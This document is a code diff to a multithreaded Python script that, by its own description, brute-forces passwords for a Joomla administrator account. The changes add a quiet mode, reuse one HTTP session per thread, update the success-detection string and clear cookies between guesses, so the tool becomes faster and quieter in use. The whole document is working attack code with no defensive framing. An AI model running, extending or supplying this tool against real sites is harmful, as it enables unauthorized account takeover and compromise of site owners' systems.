@@ -7,6 +7,7 @@ import queue
 import requests
 import requests.cookies
 import threading
+import time
 
 from html.parser import HTMLParser
 
@@ -29,6 +30,7 @@ parser.add_argument('-w', '--wordlist', type=str, dest='wordlist',
 parser.add_argument('-t', '--threads', type=int, dest='threads', default=psutil.cpu_count(),
                     help='number of worker threads to spawn, default is number of cores in system')
 parser.add_argument('-U', '--user', type=str, dest='user', default='admin', help='user to bruteforce')
+parser.add_argument('-q', '--quiet', dest='quiet', action='store_true', help='run in quiet mode')
 parser.description = '''
 This script will brute force passwords against Joomla.
 '''
@@ -37,17 +39,20 @@ args = parser.parse_args()
 # constants for stuffing the form
 USERNAME_FIELD = 'username'
 PASSWORD_FIELD = 'passwd'
-# this text is only part of resp.text when we are redirected to admin portal
-SUCCESS_CHECK = 'Global Configuration'
+# this text is only part of resp.text when we are redirected to admin portal, appears early in response.
+SUCCESS_CHECK = 'Administration - Control Panel'
 
 
 def build_terms_q(wordlist):
     terms = queue.Queue()
+    # open as binary so that we don't fail on utf-8 decode, for example
     with open(wordlist, 'rb') as wordlistfd:
         for word in wordlistfd.readlines():
             try:
+                # decode utf-8 ok => put in the queue
                 terms.put_nowait(word.decode('utf-8').rstrip())
             except:
+                # if it's not utf-8 we don't want to use it was a guess
                 pass
     return terms
 
@@ -66,14 +71,15 @@ class Bruter:
             t.start()
 
     def web_bruter(self):
+        # make a session per thread to get TCP keepalive speed and implicit cookiejar
+        sess = requests.Session()
         while not self.password_q.empty() and not self.found:
             brute = self.password_q.get().rstrip()
-            # make a short lived session to get TCP speed and implicit cookiejar
-            sess = requests.Session()
             # GET so we can fetch the token
             get_resp = sess.get(args.url)
-            # inform user
-            print(f'trying: {self.username} : {brute} - approx. {self.password_q.qsize()} tries remain')
+            # inform user unless quiet mode
+            if not args.quiet:
+                print(f'trying: {self.username} : {brute} - approx. {self.password_q.qsize()} tries remain')
             # create parser and parse token for POST
             parser = BruteParser()
             parser.feed(get_resp.text)
@@ -90,6 +96,8 @@ class Bruter:
                 print(f'username: {self.username}')
                 print(f'password: {self.passwd}')
                 print(f'Waiting for other threads to exit...')
+            # if we are here this iteration failed. clear session cookiejar before next try
+            sess.cookies.clear()
 
 
 class BruteParser(HTMLParser):
